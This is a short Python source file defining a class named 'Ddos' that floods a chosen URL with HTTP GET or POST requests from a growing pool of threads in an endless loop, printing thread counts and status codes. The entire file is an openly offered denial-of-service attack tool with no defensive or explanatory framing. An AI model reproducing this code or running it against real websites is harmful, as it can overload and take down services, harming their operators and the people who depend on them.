from threading import Thread
import requests

class Ddos:
	def __init__(self, url=None, methodId=None, maxThread=None):
		self.runningThread = 0
		self.status_code = 0

		self.url = url
		self.methodId = methodId
		self.maxThread = maxThread

	def start(self):
		if not (self.maxThread and self.methodId and self.url):
			print('Error: nil value.')
			return

		while True:
			if self.runningThread < self.maxThread:
				t = Thread(target=self.attack)
				t.setDaemon(False)
				t.start()
				self.flush()

	def attack(self):
		self.runningThread += 1
		# self.flush()

		if self.methodId == 0:
			res = requests.get(self.url)
		elif self.methodId == 1:
			res = requests.post(self.url)
		self.status_code = res.status_code

		self.runningThread -= 1
		# self.flush()

	def flush(self):
		print('Threads: ', self.runningThread, ' StatusCode: ', self.status_code)

	def setUrl(self, url):
		self.url = url

	def setMethod(self, methodId):
		# 0:get; 1:post
		self.methodId = methodId

	def setMaxThread(self, maxThread):
		self.maxThread = maxThread

